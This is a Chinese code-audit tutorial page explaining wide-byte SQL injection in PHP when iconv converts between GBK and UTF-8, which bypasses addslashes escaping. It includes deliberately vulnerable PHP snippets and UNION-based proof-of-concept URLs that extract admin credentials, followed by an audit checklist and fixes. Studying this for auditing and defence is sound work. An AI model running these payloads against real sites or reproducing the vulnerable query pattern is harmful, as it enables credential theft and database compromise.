---
title: PHP iconv 宽字节 SQL 注入深度解析：GBK 与 UTF-8 互转场景下的注入原理与 POC 构造
description: 深度解析 PHP 中 iconv 函数进行 GBK 与 UTF-8 互转时引发的宽字节 SQL 注入原理、利用条件及两种转换方向的实战 POC
  构造，基于『代码审计的艺术系列』第四季文章整理。
category: program-analysis
tags:
- 代码审计
- SQL注入
- 宽字节注入
- iconv
- 字符编码转换
- GBK
- UTF-8
- PHP安全
- 白盒测试
- HackBraid
date: 2025-08-15
updated: '2026-11-17'
---

## 概述

本页面沉淀自「白帽子分享之代码审计的艺术系列」第四季文章，由乌云核心白帽子 **HackBraid** 撰写。文章系统阐述了 PHP 应用在使用 `iconv` 函数进行 **GBK 与 UTF-8 双向编码转换** 时，如何绕过 `addslashes` / GPC 全局转义导致宽字节 SQL 注入。该漏洞成因不同于经典的 `SET NAMES gbk` 连接层面编码设置错误，而是发生在**应用层显式调用 `iconv` 转码**的过程中。

> 关联背景：该系列前三季分别覆盖了代码审计入门方法论、文件操作漏洞挖掘、全局防护绕过上篇（整型注入、数组键名注入、SERVER 变量注入、FILES 注入、变量覆盖）。本季作为「全局防护 Bypass 下篇」的核心内容，聚焦字符编码转换导致的防护失效。[[code-audit-global-protection-blindspots]]

## 核心原理：宽字节注入的本质

### 经典场景回顾：数据库连接层 `SET NAMES gbk`

当 MySQL 连接配置为 `SET character_set_client=gbk` 时，MySQL 会将客户端发来的字节流按 GBK 双字节编码解析。攻击者提交 `%df%27`（单引号），经 `addslashes` 转义变为 `%df%5c%27`（`%5c` 为反斜杠 `\`）。在 GBK 编码中 `%df%5c` 落在汉字编码范围内，被合并为一个汉字（如「運」），导致反斜杠被「吞掉」，单引号逃逸形成注入。

### 本文场景：应用层 `iconv` 显式转码

**关键区别**：数据库连接已设为 `SET NAMES binary`（二进制模式，不做编码解析），注入根因完全在于 **PHP 代码中显式调用 `iconv("gbk","utf-8",...)` 或 `iconv("utf-8","gbk",...)`** 进行转码，转码过程重现了「多字节吞噬转义字符」的效果。

## 场景一：GBK → UTF-8 转换引发注入

### 缺陷代码模式

```php
<?php
require_once('common.php');
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");

$title_tmp = isset($_GET['title']) ? urldecode($_GET['title']) : 'news title';
// 核心缺陷：显式将 GBK 转为 UTF-8
$title = iconv("gbk", "utf-8", $title_tmp);

$sql = "SELECT * FROM news WHERE title = '{$title}'";
echo $sql;
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

### 利用链构造

1. 攻击者提交 `title=%df%27`（URL 编码后为 `%df%27`）
2. `urldecode` 还原为原始字节 `\xdf\x27`
3. `addslashes` / GPC 转义单引号 → `\xdf\x5c\x27`（`\x5c` 为反斜杠）
4. `iconv("gbk","utf-8", ...)` 按 GBK 双字节解析：`\xdf\x5c` 落在 GBK 汉字区（`0x8140–0xFEFE`），合并为一个 UTF-8 汉字（如「運」`\xE8\xBF\x90`）
5. 结果字符串变为 `運'`，单引号成功逃逸

### 实战 POC

```
http://localhost/sqltest/kuanzifu1.php?title=%df' union select 1,2,concat(name,0x23,pass) from admin%23
```

> 该 POC 可直接获取 `admin` 表的 `name#pass` 拼接字段。

## 场景二：UTF-8 → GBK 转换引发注入

### 缺陷代码模式

```php
<?php
require_once('common.php');
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");

$title_tmp = isset($_GET['title']) ? urldecode($_GET['title']) : 'news title';
// 核心缺陷：显式将 UTF-8 转为 GBK
$title = iconv("utf-8", "gbk", $title_tmp);

$sql = "SELECT * FROM news WHERE title = '{$title}'";
echo $sql;
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

### 关键字符分析：「錦」字的编码特性

| 编码 | 字节序列 | 说明 |
|------|----------|------|
| UTF-8 | `E9 8C A6` | 三字节 |
| GBK   | `E5 5C`    | 双字节，第二字节 `0x5C` 即反斜杠 `\` |

### 利用链构造

1. 攻击者提交 `title=錦%27`（UTF-8 编码：`E9 8C A6 27`）
2. `addslashes` / GPC 转义单引号 → `E9 8C A6 5C 27`
3. `iconv("utf-8","gbk", ...)` 将「錦」转为 GBK `E5 5C`，整体字节流变为 `E5 5C 5C 27`
4. 进入 SQL 时，数据库连接为 `binary` 模式按字节处理：`E5 5C` 为 GBK 汉字（但此处不再解析），关键在于 **两个连续的 `5C`（`\\`）被视为转义后的单个反斜杠**，导致最后的 `27`（单引号）未被转义，成功逃逸

> 直观理解：UTF-8 转 GBK 时，「錦」的第二字节正好是 `0x5C`，转义后变成双 `0x5C`，数据库层面按转义规则消解为单 `0x5C`，单引号脱离转义。

### 实战 POC

```
http://localhost/sqltest/kuanzifu2.php?title=錦' union select 1,2,concat(name,0x23,pass) from admin%23
```

## 代码审计检测清单

| 检测点 | 关键词 / 模式 | 判断标准 |
|--------|---------------|----------|
| 显式编码转换 | `iconv(`, `mb_convert_encoding(`, `iconv_set_encoding(` | 搜索全项目，重点排查 `from_encoding` 与 `to_encoding` 组合为 `gbk`/`utf-8` 互转的调用 |
| 转码前无编码校验 | 直接对 `$_GET`/`$_POST`/`$_REQUEST` 调用 `iconv` | 若输入未做严格字符集合法性校验（如 `mb_check_encoding`），视为高危 |
| 数据库连接编码 | `SET NAMES`, `mysqli::set_charset`, `PDO::MYSQL_ATTR_INIT_COMMAND` | 确认连接层是否为 `binary`/`utf8mb4`；若为 `gbk` 则属于经典宽字节场景，审计重点不同 |
| 全局转义状态 | `get_magic_quotes_gpc()`, `addslashes` 手动调用 | 确认转义生效点，判断单引号是否在转码**前**被转义（本文两种场景均为转义在前） |
| SQL 拼接方式 | 字符串插值 / 拼接入 SQL | 若使用参数化查询（Prepared Statements），则无注入风险，转码仅影响数据正确性 |

## 修复方案

1. **首选：参数化查询（Prepared Statements）**  
   彻底分离代码与数据，编码转换不再影响 SQL 语义。

2. **次选：统一字符集，避免转码**  
   - 数据库、连接、页面、PHP 内部编码全链路统一为 `utf8mb4`  
   - 若业务必须兼容 GBK，仅在**入口处**统一转为内部编码，**后续全程不再转码**

3. **若必须转码：转码前做严格编码合法性校验**  
   ```php
   if (!mb_check_encoding($input, 'GBK')) { die('Invalid encoding'); }
   $title = iconv('GBK', 'UTF-8', $input);
   ```
   拒绝非法字节序列，从源头切断「构造特定字节吞噬转义字符」的可能。

4. **转码后再次转义（防御深度）**  
   ```php
   $title = iconv('GBK', 'UTF-8', $title_tmp);
   $title = mysqli_real_escape_string($conn, $title); // 针对当前连接字符集再次转义
   ```
   注意：需在**转码之后**、**拼接 SQL 之前**调用，且连接字符集必须与转码目标一致。

## 交叉引用与延伸阅读

- [[code-audit-global-protection-blindspots]] — 系统梳理全局防护六大盲点，本页面对应「字符编码转换绕过」专题的深度展开
- [[code-audit-file-operation-vulnerabilities]] — 代码审计方法论总览，含危险函数识别、漏洞挖掘流程
- [[ctfshow-web-sql-injection-bypass-basics]] — CTF 实战中的宽字节注入绕过技巧与题目复现
- [[xd-security-code-audit-notes-day50-57]] — XD安全代码审计阶段学习笔记，覆盖 ThinkPHP/Struts2/SpringBoot 等框架审计要点
- [[sqlmap-comprehensive-guide]] — SQLMap 自动化检测与利用，可辅助验证本类注入点
- [[xd-security-waf-bypass-techniques-day46-49]] — WAF 绕过视角下的编码转换利用技巧

## 附录：GBK 汉字编码范围（参考）

| 区间 | 字节范围 | 说明 |
|------|----------|------|
| 一级汉字 | `0xB0A1 – 0xD7FE` | 3755 字 |
| 二级汉字 | `0xD8A1 – 0xFEFE` | 3008 字 |
| 扩展区 | `0x8140 – 0xA0FE` | 含符号、部首等 |

> 攻击字节 `%df`（`0xDF`）落在二级汉字高字节范围内，配合 `%5c`（`0x5C`）构成合法 GBK 汉字，是经典宽字节注入的常用前导字节。

---

*本页面基于「白帽子分享之代码审计的艺术系列第四季」微信归档文章整理，原作者 HackBraid（乌云核心白帽子），归档日期约 2016 年。页面维护者：数字知识库策展人。*

## 来源

- [301在路上-201508-202208_142](../sources/301在路上-201508-202208_142.md)
